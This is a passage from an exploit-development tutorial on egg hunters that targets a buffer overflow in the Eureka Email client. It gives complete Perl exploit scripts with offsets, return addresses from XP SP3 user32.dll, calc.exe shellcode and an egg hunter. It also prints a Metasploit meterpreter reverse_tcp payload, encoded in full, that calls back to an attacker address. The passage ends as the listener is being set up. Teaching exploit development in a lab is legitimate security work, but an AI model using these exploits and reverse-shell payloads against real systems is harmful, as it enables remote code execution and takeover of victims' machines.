in the IP address of the host that is running the perl script\nas POP3 server.  In my example, I am running the fake perl POP3 server\non 192.168.0.193 so my configuration looks like this :\n[62]image\n(you\u2019ll have to enter something under POP Username & Password, but it\ncan be anything). Save the settings.\nNow attach Immunity Debugger to Eureka Email and let it run\n[63]image\nWhen the client is running (with Immunity Attached), go back to Eureka\nMail Client, go to \u201cFile\u201d and choose \u201cSend and receive emails\u201d\n[64]image\nThe application dies. You can stop the perl script (it will still be\nrunning \u2013 endless loop remember).  Look at the Immunity Debugger Log\nand registers : \u201cAccess violation when executing [37784136]\u201d\nRegisters look like this :\n[65]image\nNow run the following command :\n!pvefindaddr suggest\nNow it will become clear why I used a Metasploit pattern and not just\n2000 A\u2019s.  Upon running the !pvefindaddr suggest command, this plugin\nwill evaluate the crash, look for Metasploit references, tries to find\noffsets, tries to tell what kind of exploit it is, and even tries to\nbuild example payload with the correct offsets :\n[66]image\nLife is good :-)\nSo now we know that :\n\u2013 it\u2019s a direct RET overwrite. RET is overwritten after 710 bytes\n(VirtualBox). I did notice that, depending on the length of the IP\naddress or hostname that was used to reference the POP3 server in\nEureka Email (under connection settings), the offset to overwrite RET\nmay vary. So if you use 127.0.0.1 (which is 4 bytes shorter than\n192.168.0.193), the offset will be 714). There is a way to make the\nexploit generic : get the length of the local IP (because that is where\nthe Eureka Mail Client will connect to) and calculate the offset size\nbased on the length of the IP.   (723 \u2013 length of IP)\n\u2013 both ESP and EDI contain a reference to the shellcode. ESP after 714\nbytes and EDI points to an offset of 991 bytes. (again, modify offsets\naccording to what you find on your own system)\nSo far so good.  We could jump to EDI or to ESP.\nESP points to an address on the stack (0x0012cd6c) and EDI points to an\naddress in the .data section of the application (0x00473678 \u2013 see\nmemory map).\n[67]image\nIf we look at ESP, we can see that we only have a limited amount of\nshellcode space available :\n[68]image\nOf course, you could jump to ESP, and write jumpback code at ESP so you\ncould use a large part of the buffer before overwriting RET.  But you\nwill still only have something like 700 bytes of space (which is ok to\nspawn calc and do some other basic stuff\u2026 ).\nJumping to EDI may work too. Use the \u2018!pvefindaddr j edi\u2019 to find all\n\u201cjump edi\u201d trampolines. (All addresses are written to file j.txt). I\u2019ll\nuse 0x7E47B533 (from user32.dll on XP SP3). Change the script & test if\nthis normal direct RET overwrite exploit would work :\nuse Socket;\n#fill out the local IP or hostname\n#which is used by Eureka EMail as POP3 server\n#note : must be exact match !\nmy $localserver = \"192.168.0.193\";\n#calculate offset to EIP\nmy $junk = \"A\" x (723 - length($localserver));\nmy $ret=pack('V',0x7E47B533);  #jmp edi from user32.dll XP SP3\nmy $padding = \"\\x90\" x 277;\n#calc.exe\nmy $shellcode=\"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nmy $payload=$junk.$ret.$padding.$shellcode;\n#set up listener on port 110\nmy $port=110;\nmy $proto=getprotobyname('tcp');\nsocket(SERVER,PF_INET,SOCK_STREAM,$proto);\nmy $paddr=sockaddr_in($port,INADDR_ANY);\nbind(SERVER,$paddr);\nlisten(SERVER,SOMAXCONN);\nprint \"[+] Listening on tcp port 110 [POP3]... \\n\";\nprint \"[+] Configure Eureka Mail Client to connect to this host\\n\";\nmy $client_addr;\nwhile($client_addr=accept(CLIENT,SERVER))\n{\nprint \"[+] Client connected, sending evil payload\\n\";\nwhile(1)\n{\nprint CLIENT \"-ERR \".$payload.\"\\n\";\nprint \" -> Sent \".length($payload).\" bytes\\n\";\n}\n}\nclose CLIENT;\nprint \"[+] Connection closed\\n\";\nAttach Immunity to Eureka, and set a breakpoint at 0x7E47B533 (jmp\nedi).\nTrigger the exploit. Immunity breaks at jmp edi. When we look at the\nregisters now, instead of finding our shellcode at EDI, we see A\u2019s.\nThat\u2019s not what we have expected, but it\u2019s still ok, because we control\nthe A\u2019s.  This scenario, however, would be more or less the same as\nwhen using jmp esp : we would only have about 700 bytes of space.\n(Alternatively, of course, you could use nops instead of A\u2019s, and write\na short jump just before RET is overwritten. Then place the shellcode\ndirectly after overwrite RET and it should work too.)\n[69]image\nBut let\u2019s do it the \u201chard\u201d way this time, just to demonstrate that it\nworks.  Even though we see A\u2019s where we may have expected to see\nshellcode, our shellcode is still placed somewhere in memory. If we\nlook a little bit further, we can see our shellcode at 0x00473992 :\n[70]image\nThis address may not be static\u2026 so let\u2019s make the exploit more dynamic\nand use an egg hunter to find and execute the shellcode.\nWe\u2019ll use an initial jmp to esp (because esp is only 714 bytes away),\nput our egg hunter at esp, then write some padding, and then place our\nreal shellcode (prepended with the marker)\u2026 Then no matter where our\nshellcode is placed, the egg hunter should find & execute it.\nThe egg hunter code (I\u2019m using the NtAccessCheckAndAuditAlarm method in\nthis example) looks like this :\nmy $egghunter =\n\"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8\".\n\"\\x77\\x30\\x30\\x74\". # this is the marker\/tag: w00t\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7\";\nThe tag used in this example is the string w00t.  This 32 byte\nshellcode will search memory for \u201cw00tw00t\u201d and execute the code just\nbehind it.  This is the code that needs to be placed at esp.\nWhen we write our shellcode in the payload, we need to prepend it with\nw00tw00t (= 2 times the tag \u2013 after all, just looking for a single\ninstance of the egg would probably result in finding the second part of\negg hunter itself, and not the shellcode)\nFirst, locate jump esp (!pvefindaddr j esp). I\u2019ll use 0x7E47BCAF (jmp\nesp) from user32.dll (XP SP3).\nChange the exploit script so the payload does this :\n\u2013 overwrite EIP after 710 bytes with jmp esp\n\u2013 put the $egghunter at ESP.  The egghunter will look for \u201cw00tw00t\u201d\n\u2013 add some padding (could be anything\u2026 nops, A\u2019s\u2026 as long as you don\u2019t\nuse w00t :) )\n\u2013 prepend \u201cw00tw00t\u201d before the real shellcode\n\u2013 write the real shellcode\nuse Socket;\n#fill out the local IP or hostname\n#which is used by Eureka EMail as POP3 server\n#note : must be exact match !\nmy $localserver = \"192.168.0.193\";\n#calculate offset to EIP\nmy $junk = \"A\" x (723 - length($localserver));\nmy $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll\nmy $padding = \"\\x90\" x 1000;\nmy $egghunter = \"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x7\n4\\xEF\\xB8\".\n\"\\x77\\x30\\x30\\x74\". # this is the marker\/tag: w00t\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7\";\n#calc.exe\nmy $shellcode=\"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nmy $payload=$junk.$ret.$egghunter.$padding.\"w00tw00t\".$shellcode;\n#set up listener on port 110\nmy $port=110;\nmy $proto=getprotobyname('tcp');\nsocket(SERVER,PF_INET,SOCK_STREAM,$proto);\nmy $paddr=sockaddr_in($port,INADDR_ANY);\nbind(SERVER,$paddr);\nlisten(SERVER,SOMAXCONN);\nprint \"[+] Listening on tcp port 110 [POP3]... \\n\";\nprint \"[+] Configure Eureka Mail Client to connect to this host\\n\";\nmy $client_addr;\nwhile($client_addr=accept(CLIENT,SERVER))\n{\nprint \"[+] Client connected, sending evil payload\\n\";\nwhile(1)\n{\nprint CLIENT \"-ERR \".$payload.\"\\n\";\nprint \" -> Sent \".length($payload).\" bytes\\n\";\n}\n}\nclose CLIENT;\nprint \"[+] Connection closed\\n\";\nAttach Immunity to Eureka Mail, and set a breakpoint at 0x7E47BCAF.\nContinue to run Eureka Email.\nTrigger the exploit. Immunity will break at the jmp esp breakpoint.\nNow look at esp (before the jump is made) :\nWe can see our egghunter at 0x0012cd6c\nAt 0x12cd7d (mov eax,74303077), we find our string w00t.\n[71]image\nContinue to run the application, and calc.exe should pop up\n[72]image\nNice.\nAs a little exercise, let\u2019s try to figure out where exactly the\nshellcode was located in memory when it got executed.\nPut a break between the 2 eggs and the shellcode (so prepend the\nshellcode with 0xCC), and run the exploit again (attached to the\ndebugger)\n[73]image\nThe egg+shellcode was found in the resources section of the\napplication.\n[74]image\nSo it looks like the egghunter (at 0x0012cd6c) had to search memory\nuntil it reached 0x004739AD.\nIf we look back (put breakpoint at jmp esp) and look at stack,we see\nthis :\n[75]image\nDespite the fact that the shellcode was not located anywhere near the\nhunter, It did not take a very long time before the egg hunter could\nlocate the eggs and execute the shellcode.  Cool !\nBut what if the shellcode is on the heap ? How can we find all\ninstances of the shellcode in memory? What if it takes a long time\nbefore the shellcode is found ? What if we must tweak the hunter so it\nwould start searching in a particular place in memory ? And is there a\nway to change the place where the egg hunter will start the search ?  A\nlot of questions, so let\u2019s continue.\nTweaking the egg hunter start position (for fun, speed and reliability)\nWhen the egg hunter in our example starts executing, it will perform\nthe following instructions :\n(Let\u2019s pretend that EDX points to 0x0012E468 at this point, and the egg\nsits at 0x0012f555 or so. )\n0012F460 66:81CA FF0F OR DX,0FFF 0012F465 42 INC EDX\n0012F466   52               PUSH EDX\n0012F467   6A 02            PUSH 2\n0012F469   58               POP EAX\nThe first instruction will put 0x0012FFFF into EDX. The next\ninstruction (INC EDX) increments EDX with 1, so EDX now points at\n0x00130000. This is the end of the current stack frame, so the search\ndoes not even start in a location where it would potentially find a\ncopy of the shellcode in the same stack frame. (Ok, there is no copy of\nthe shellcode in that location in our example, but it could have been\nthe case).  The egg+shellcode are somewhere in memory, and the egg\nhunter will eventually find the egg+shellcode. No problems there.\nIf the shellcode could only be found on the current stack frame (which\nwould be rare \u2013 but hey, can happen), then it may not be possible to\nfind the shellcode using this egg hunter (because the hunter would\nstart searching *after* the shellcode\u2026)  Obviously, if you can execute\nsome lines of code, and the shellcode is on the stack as well, it may\nbe easier to jump to the shellcode directly by using a near or far jump\nusing an offset\u2026   But it may not be reliable to do so.\nAnyways, there could be a case where you would need to tweak the egg\nhunter a bit so it starts looking in the right place (by positioning\nitself before the eggs and as close as possible to the eggs, and then\nexecute the search loop).\nDo some debugging and you\u2019ll see. (watch the EDI register when the\negghunter runs and you\u2019ll see where it starts).  If modifying the egg\nhunter is required, then it may be worth while playing with the first\ninstruction of the egg hunter a little.  Replacing FF0F with 00 00 will\nallow you to search the current stack frame if that is required\u2026  Of\ncourse, this one would contain null bytes and you would have to deal\nwith that.   If that is a problem,  you may need to be a little\ncreative.\nThere may be other ways to position yourself closer, by replacing\n0x66,0x81,0xca,0xff,0x0f with some instructions that would (depending\non your requirements). Some examples :\n\u2013 find the beginning of the current stack frame and put that value in\nEDI\n\u2013 move the contents of another register into EDI\n\u2013 find the beginning of the heap and put that value in EDI (in fact,\nget PEB at TEB+0x30 and then get all process heaps at PEB+0x90). Check\n[76]this document for more info on building a heap only egg hunter\n\u2013 find the image base address and put it in EDI\n\u2013 put a custom value in EDI (dangerous \u2013 that would be like hardcoding\nan address, so make sure whatever you put in EDI is located BEFORE the\neggs+shellcode).   You could look at the other registers at the moment\nthe egghunter code would run and see if one of the registers could be\nplaced in EDI to make the hunter start closer to the egg. Alternatively\nsee what is in ESP (perhaps a couple of pop edi instructions may put\nsomething usefull in EDI)\n\u2013 etc\nOf course, tweaking the start location is only advised if\n\u2013 speed really is an issue\n\u2013 the exploit does not work otherwise\n\u2013 you can perform the change in a generic way or if this is a custom\nexploit that needs to work only once.\nAnyways, I just wanted to mention that you should be a little creative\nin order to make a better exploit, a faster exploit, a smaller exploit,\netc.\nHey, the egg hunter works fine in most cases ! Why would I ever need to\nchange the start address ?\nOk \u2013 good question\nThere may be a case where the final shellcode (tag+shellcode) is\nlocated in multiple places in memory, and some of these copies are\ncorrupted\/truncated\/\u2026  ( = They set us up the bomb ) In this particular\nscenario, there may be good reason to reposition the egg hunter seach\nstart location so it would try to avoid corrupted copies. (After all,\nthe egg hunter only looks at the 8 byte tag and not at the rest of the\nshellcode behind it)\nA good way of finding out if your shellcode\n\u2013 is somewhere in memory (and where it is)\n\u2013 is corrupt or not\nis by using the \u201c!pvefindaddr compare\u201d functionality, which was added\nin version 1.16 of the plugin.\nThis feature was really added to compare shellcode in memory with\nshellcode in a file, but it will dynamically search for all instances\nof the shellcode. So you can see where your shellcode is found, and\nwhether the code in a given location was modified\/cut off in memory or\nnot.   Using that information, you can make a decision whether you\nshould tweak the egg hunter start position or not, and if you have to\nchange it, where you need to change it into.\nA little demo on how to compare shellcode  :\nFirst, you need to write your shellcode to a file.  You can use a\nlittle script like this to write the shellcode to a file :\n# write shellcode for calc.exe to file called code.bin\n# you can - of course - prepend this with egghunter tag\n# if you want\n#\nmy $shellcode=\"\\x89\\xe2\\xda\\xc1\\xd9\\x72\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\\x49\" .\n\"\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5a\\x56\\x54\\x58\\x33\\x30\\x56\" .\n\"\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\" .\n\"\\x42\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\" .\n\"\\x30\\x42\\x42\\x58\\x50\\x38\\x41\\x43\\x4a\\x4a\\x49\\x4b\\x4c\\x4a\" .\n\"\\x48\\x50\\x44\\x43\\x30\\x43\\x30\\x45\\x50\\x4c\\x4b\\x47\\x35\\x47\" .\n\"\\x4c\\x4c\\x4b\\x43\\x4c\\x43\\x35\\x43\\x48\\x45\\x51\\x4a\\x4f\\x4c\" .\n\"\\x4b\\x50\\x4f\\x42\\x38\\x4c\\x4b\\x51\\x4f\\x47\\x50\\x43\\x31\\x4a\" .\n\"\\x4b\\x51\\x59\\x4c\\x4b\\x46\\x54\\x4c\\x4b\\x43\\x31\\x4a\\x4e\\x50\" .\n\"\\x31\\x49\\x50\\x4c\\x59\\x4e\\x4c\\x4c\\x44\\x49\\x50\\x43\\x44\\x43\" .\n\"\\x37\\x49\\x51\\x49\\x5a\\x44\\x4d\\x43\\x31\\x49\\x52\\x4a\\x4b\\x4a\" .\n\"\\x54\\x47\\x4b\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\\x4b\\x55\\x4c\" .\n\"\\x4b\\x51\\x4f\\x51\\x34\\x45\\x51\\x4a\\x4b\\x42\\x46\\x4c\\x4b\\x44\" .\n\"\\x4c\\x50\\x4b\\x4c\\x4b\\x51\\x4f\\x45\\x4c\\x45\\x51\\x4a\\x4b\\x4c\" .\n\"\\x4b\\x45\\x4c\\x4c\\x4b\\x45\\x51\\x4a\\x4b\\x4d\\x59\\x51\\x4c\\x47\" .\n\"\\x54\\x43\\x34\\x48\\x43\\x51\\x4f\\x46\\x51\\x4b\\x46\\x43\\x50\\x50\" .\n\"\\x56\\x45\\x34\\x4c\\x4b\\x47\\x36\\x50\\x30\\x4c\\x4b\\x51\\x50\\x44\" .\n\"\\x4c\\x4c\\x4b\\x44\\x30\\x45\\x4c\\x4e\\x4d\\x4c\\x4b\\x45\\x38\\x43\" .\n\"\\x38\\x4b\\x39\\x4a\\x58\\x4c\\x43\\x49\\x50\\x42\\x4a\\x50\\x50\\x42\" .\n\"\\x48\\x4c\\x30\\x4d\\x5a\\x43\\x34\\x51\\x4f\\x45\\x38\\x4a\\x38\\x4b\" .\n\"\\x4e\\x4d\\x5a\\x44\\x4e\\x46\\x37\\x4b\\x4f\\x4d\\x37\\x42\\x43\\x45\" .\n\"\\x31\\x42\\x4c\\x42\\x43\\x45\\x50\\x41\\x41\";\nopen(FILE,\">code.bin\");\nprint FILE $shellcode;\nprint \"Wrote \".length($shellcode).\" bytes to file code.bin\\n\";\nclose(FILE);\n(We\u2019ll assume you have written the file into c:\\tmp\u201d. Note that in this\nexample, I did not prepend the shellcode with w00tw00t, because this\ntechnique really is not limited to egg hunters. Of course, if you want\nto prepend it with w00tw00t \u2013 be my guest)\nNext, attach Immunity Debugger to the application, put a breakpoint\nbefore the shellcode would get executed, and then trigger the exploit.\nNow run the following PyCommand :  !pvefindaddr compare c:\\tmp\\code.bin\nThe script will open the file, take the first 8 bytes, and search\nmemory for each location that points to these 8 bytes. Then, at each\nlocation, it will compare the shellcode in memory with the original\ncode in the file.\nIf the shellcode is unmodified, you\u2019ll see something like this :\n[77]image\nIf the shellcode is different (I have replaced some bytes with\nsomething else, just for testing purposes), you\u2019ll get something like\nthis :\n\u2013 for each unmatched byte, you\u2019ll get an entry in the log, indicating\nthe position in the shellcode, the original value (= what is found in\nthe file at that position), and the value found in memory (so you can\nuse this to build a list of bad chars, or to determine that \u2013 for\nexample \u2013 shellcode was converted to uppercase or lowercase\u2026. )\n\u2013 a visual representation will be given, indicating \u201c\u2013\u201c when bytes\ndon\u2019t match :\n[78]image\nSo if one of the instances in memory seems to be corrupted, you can try\nto re-encode the shellcode to filter out bad chars\u2026 but if there is one\ninstance that is not broken, you can try to figure out a way to get the\negg hunter to start at a location that would trigger the hunter to find\nthe unmodified version of the shellcode first :-)\nNote : you can compare bytes in memory (at a specific location) with\nbytes from a file by adding the memory address to the command line :\n[79]image\nSee if the egg hunter still works with larger shellcode (which is one of the\ngoals behind using egg hunters)\nLet\u2019s try again with larger shellcode.  We\u2019ll try to spawn a\nmeterpreter session over tcp (reverse connect to attacker) in the same\nEureka Email exploit.\nGenerate the shellcode. My attacker machine is at 192.168.0.122. The\ndefault port is 4444. We\u2019ll use alpha_mixed as encoder,  so the command\nwould be :\n.\/msfpayload windows\/meterpreter\/reverse_tcp LHOST=192.168.0.122 R |\n.\/msfencode -b \u20180x00\u2019 -t perl -e x86\/alpha_mixed\n.\/msfpayload windows\/meterpreter\/reverse_tcp LHOST=192.168.0.122 R | .\/msfencode\n-b '0x00' -t perl -e x86\/alpha_mixed\n[*] x86\/alpha_mixed succeeded with size 644 (iteration=1)\nmy $buf =\n\"\\x89\\xe5\\xd9\\xe5\\xd9\\x75\\xf4\\x5e\\x56\\x59\\x49\\x49\\x49\\x49\" .\n\"\\x49\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x51\" .\n\"\\x5a\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\" .\n\"\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\" .\n\"\\x42\\x75\\x4a\\x49\\x49\\x6c\\x4b\\x58\\x4e\\x69\\x45\\x50\\x45\\x50\" .\n\"\\x45\\x50\\x43\\x50\\x4c\\x49\\x4b\\x55\\x46\\x51\\x49\\x42\\x50\\x64\" .\n\"\\x4e\\x6b\\x42\\x72\\x44\\x70\\x4c\\x4b\\x46\\x32\\x46\\x6c\\x4e\\x6b\" .\n\"\\x43\\x62\\x45\\x44\\x4e\\x6b\\x44\\x32\\x51\\x38\\x46\\x6f\\x4c\\x77\" .\n\"\\x50\\x4a\\x45\\x76\\x45\\x61\\x4b\\x4f\\x45\\x61\\x49\\x50\\x4e\\x4c\" .\n\"\\x47\\x4c\\x43\\x51\\x43\\x4c\\x46\\x62\\x44\\x6c\\x51\\x30\\x4f\\x31\" .\n\"\\x4a\\x6f\\x44\\x4d\\x43\\x31\\x4f\\x37\\x4d\\x32\\x4c\\x30\\x50\\x52\" .\n\"\\x42\\x77\\x4e\\x6b\\x50\\x52\\x44\\x50\\x4e\\x6b\\x50\\x42\\x47\\x4c\" .\n\"\\x43\\x31\\x4a\\x70\\x4e\\x6b\\x43\\x70\\x43\\x48\\x4b\\x35\\x49\\x50\" .\n\"\\x43\\x44\\x43\\x7a\\x45\\x51\\x48\\x50\\x46\\x30\\x4e\\x6b\\x43\\x78\" .\n\"\\x45\\x48\\x4c\\x4b\\x50\\x58\\x45\\x70\\x47\\x71\\x49\\x43\\x4a\\x43\" .\n\"\\x47\\x4c\\x42\\x69\\x4c\\x4b\\x44\\x74\\x4e\\x6b\\x47\\x71\\x49\\x46\" .\n\"\\x50\\x31\\x49\\x6f\\x50\\x31\\x4b\\x70\\x4e\\x4c\\x4b\\x71\\x4a\\x6f\" .\n\"\\x44\\x4d\\x47\\x71\\x4b\\x77\\x45\\x68\\x4b\\x50\\x43\\x45\\x4a\\x54\" .\n\"\\x47\\x73\\x43\\x4d\\x49\\x68\\x45\\x6b\\x43\\x4d\\x51\\x34\\x44\\x35\" .\n\"\\x4d\\x32\\x51\\x48\\x4c\\x4b\\x42\\x78\\x51\\x34\\x47\\x71\\x4b\\x63\" .\n\"\\x43\\x56\\x4e\\x6b\\x46\\x6c\\x50\\x4b\\x4c\\x4b\\x43\\x68\\x47\\x6c\" .\n\"\\x45\\x51\\x4e\\x33\\x4e\\x6b\\x45\\x54\\x4e\\x6b\\x46\\x61\\x4a\\x70\" .\n\"\\x4c\\x49\\x50\\x44\\x51\\x34\\x45\\x74\\x51\\x4b\\x43\\x6b\\x51\\x71\" .\n\"\\x51\\x49\\x50\\x5a\\x42\\x71\\x49\\x6f\\x4d\\x30\\x51\\x48\\x43\\x6f\" .\n\"\\x51\\x4a\\x4c\\x4b\\x44\\x52\\x4a\\x4b\\x4d\\x56\\x51\\x4d\\x51\\x78\" .\n\"\\x46\\x53\\x46\\x52\\x45\\x50\\x47\\x70\\x50\\x68\\x42\\x57\\x50\\x73\" .\n\"\\x50\\x32\\x51\\x4f\\x50\\x54\\x51\\x78\\x42\\x6c\\x44\\x37\\x46\\x46\" .\n\"\\x43\\x37\\x49\\x6f\\x4e\\x35\\x4c\\x78\\x4c\\x50\\x46\\x61\\x43\\x30\" .\n\"\\x45\\x50\\x46\\x49\\x4a\\x64\\x51\\x44\\x50\\x50\\x43\\x58\\x44\\x69\" .\n\"\\x4f\\x70\\x42\\x4b\\x45\\x50\\x4b\\x4f\\x48\\x55\\x50\\x50\\x46\\x30\" .\n\"\\x42\\x70\\x50\\x50\\x47\\x30\\x50\\x50\\x43\\x70\\x46\\x30\\x45\\x38\" .\n\"\\x48\\x6a\\x46\\x6f\\x49\\x4f\\x49\\x70\\x4b\\x4f\\x4e\\x35\\x4f\\x67\" .\n\"\\x42\\x4a\\x47\\x75\\x51\\x78\\x4f\\x30\\x4f\\x58\\x43\\x30\\x42\\x5a\" .\n\"\\x50\\x68\\x46\\x62\\x43\\x30\\x42\\x31\\x43\\x6c\\x4c\\x49\\x4d\\x36\" .\n\"\\x50\\x6a\\x42\\x30\\x46\\x36\\x46\\x37\\x42\\x48\\x4d\\x49\\x4e\\x45\" .\n\"\\x42\\x54\\x51\\x71\\x49\\x6f\\x4e\\x35\\x4d\\x55\\x49\\x50\\x44\\x34\" .\n\"\\x44\\x4c\\x49\\x6f\\x50\\x4e\\x44\\x48\\x50\\x75\\x4a\\x4c\\x43\\x58\" .\n\"\\x4c\\x30\\x4c\\x75\\x49\\x32\\x42\\x76\\x49\\x6f\\x4a\\x75\\x43\\x5a\" .\n\"\\x45\\x50\\x51\\x7a\\x43\\x34\\x42\\x76\\x50\\x57\\x51\\x78\\x45\\x52\" .\n\"\\x4b\\x69\\x4b\\x78\\x43\\x6f\\x49\\x6f\\x48\\x55\\x4e\\x6b\\x46\\x56\" .\n\"\\x51\\x7a\\x51\\x50\\x43\\x58\\x45\\x50\\x46\\x70\\x45\\x50\\x45\\x50\" .\n\"\\x51\\x46\\x42\\x4a\\x45\\x50\\x50\\x68\\x51\\x48\\x4f\\x54\\x46\\x33\" .\n\"\\x4d\\x35\\x4b\\x4f\\x4b\\x65\\x4e\\x73\\x46\\x33\\x42\\x4a\\x43\\x30\" .\n\"\\x50\\x56\\x43\\x63\\x50\\x57\\x42\\x48\\x44\\x42\\x48\\x59\\x49\\x58\" .\n\"\\x51\\x4f\\x49\\x6f\\x4b\\x65\\x43\\x31\\x49\\x53\\x46\\x49\\x4b\\x76\" .\n\"\\x4d\\x55\\x4b\\x46\\x51\\x65\\x48\\x6c\\x49\\x53\\x47\\x7a\\x41\\x41\";\nIn the exploit script, replace the calc.exe shellcode with the one\ngenerated above.\nBefore running the exploit, set up the meterpreter listener :\n.\/msfconsole\n____________\n< metasploit >\n------------\n\\   ,__,\n\\  (oo)____\n(__)    